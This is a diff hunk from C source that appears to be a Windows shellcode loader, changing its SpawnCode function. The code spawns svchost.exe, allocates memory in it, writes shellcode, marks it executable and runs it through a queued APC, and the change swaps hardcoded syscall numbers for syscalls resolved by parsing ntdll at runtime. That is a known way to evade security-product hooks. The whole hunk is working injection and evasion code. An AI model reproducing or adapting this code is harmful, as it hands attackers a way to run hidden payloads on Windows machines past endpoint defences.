@@ -178,34 +178,31 @@ BOOL SpawnCode(CHAR* Bytes, SIZE_T Size)
         CreateProcessA("C:\\Windows\\system32\\svchost.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo, &pInfo);
 
         LPVOID rBuffer = NULL;
+        struct NtInfo NtdllInfo;
+        struct Syscalls rSyscall;
         SIZE_T uSize = (SIZE_T)Size;
 
-        // make sure we are using the correct syscall numbers, probly a nicer way of doing this
-        if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
-        {
-            NtQueueApcThread     = &NtQueueApcThread10;
-            NtWriteVirtualMemory = &NtWriteVirtualMemory10;
-            NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
-            NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
-        } else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
-        {
-            NtQueueApcThread     = &NtQueueApcThread81;
-            NtWriteVirtualMemory = &NtWriteVirtualMemory81;
-            NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
-            NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
-        }
+        ParseNtdll(&NtdllInfo, &rSyscall);
 
         // alloc the memory we need inside the process
-        NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtAllocateVirtualMemory(pInfo.hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        CleanSyscall(SyscallStub);
 
         // write our shellcode bytes to the process
-        NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtWriteVirtualMemory(pInfo.hProcess, rBuffer, Bytes, Size, NULL);
+        CleanSyscall(SyscallStub);
 
         // change the permisions on the memory so we can execute it
-        NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
+        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtProtectVirtualMemory(pInfo.hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
+        CleanSyscall(SyscallStub);
 
         // execute the code inside the process
-        NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
+        MakeSyscall("NtQueueApcThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtQueueApcThread(pInfo.hThread, (PIO_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
+        CleanSyscall(SyscallStub);
     #endif
 
     // use straight api calls if we are not in secure mode
